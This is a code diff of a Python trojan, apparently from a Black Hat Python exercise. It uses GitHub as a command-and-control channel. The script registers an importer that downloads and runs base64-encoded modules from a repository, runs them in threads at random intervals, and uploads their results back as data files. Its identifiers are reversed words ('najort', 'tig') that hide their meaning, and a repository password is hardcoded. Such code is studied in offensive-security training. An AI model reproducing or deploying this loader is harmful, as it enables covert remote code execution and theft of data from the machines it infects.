@@ -20,8 +20,10 @@ access_token_path = 'access_token.txt.enc'
 repository = 'chrisarm/BHP'
 access_token_pass = 'bhp1BHP!'
 najort_id = 'tset_najort'
-najort_config = 'ch7/{}.json'.format(najort_id)
-data_path = 'ch7/data/{}/'.format(najort_id)
+base_path = 'tig_najort/'
+module_path = base_path + 'modules/'
+najort_config = '{base}{json}.json'.format(base=base_path, json=najort_id)
+data_path = '{base}data/{najort}/'.format(base=base_path, najort=najort_id)
 
 najort_mods = []
 configured = False
@@ -99,9 +101,9 @@ def store_module_result(data, repository=''):
     Enables moduels to store data in github
     '''
     hg, repo, branch = connect_to_github()
-    remote_path = 'ch7/data/{}/{}.dat'.format(
-        najort_id,
-        random.randint(1000, 10000))
+    remote_path = '{data}{random}.dat'.format(
+        data=data_path,
+        random=random.randint(1000, 10000))
     vprint('Saving module data: {}'.format(data))
     repo.create_file(remote_path, 'Moar Mods Results', data)
     return
@@ -109,16 +111,24 @@ def store_module_result(data, repository=''):
 
 def module_runner(module, test):
     task_queue.put(1)
-    result = sys.modules[module].run(test)
+
+    if test == 'True':
+        test = True
+    else:
+        test = False
+
+    result = sys.modules[module].run(test=test)
     task_queue.get()
     store_module_result(result)
     return
+
 
 # GitImport Class
 class GitImporter:
     '''
     Provides an object which can import modules from Github.
     '''
+
     def __init__(self):
         self.current_module_code = ''
         self.config = dict()
@@ -126,7 +136,9 @@ class GitImporter:
     def find_module(self, fullname, path=None):
         if fullname.startswith('tig_'):
             vprint('Attempting to retrieve {}'.format(fullname))
-            new_library = get_file_contents('ch7/modules/{}'.format(fullname))
+            new_library = get_file_contents('{module}{fname}'.format(
+                module=module_path,
+                fname=fullname))
             vprint(new_library)
             if new_library:
                 self.current_module_code = base64.b64decode(new_library)
@@ -146,6 +158,7 @@ class GitImporter:
         else:
             raise ValueError('Module {} not loaded.'.format(name))
 
+
 # Main Class
 def main():
     sys.meta_path.append(GitImporter())
@@ -159,7 +172,7 @@ def main():
                 for task in config:
                     t = threading.Thread(
                         target=module_runner,
-                        args=(task['module'],task['test']))
+                        args=(task['module'], task['test']))
                     t.start()
                     time.sleep(random.randint(1, 10))
         time.sleep(random.randint(100, 1000))
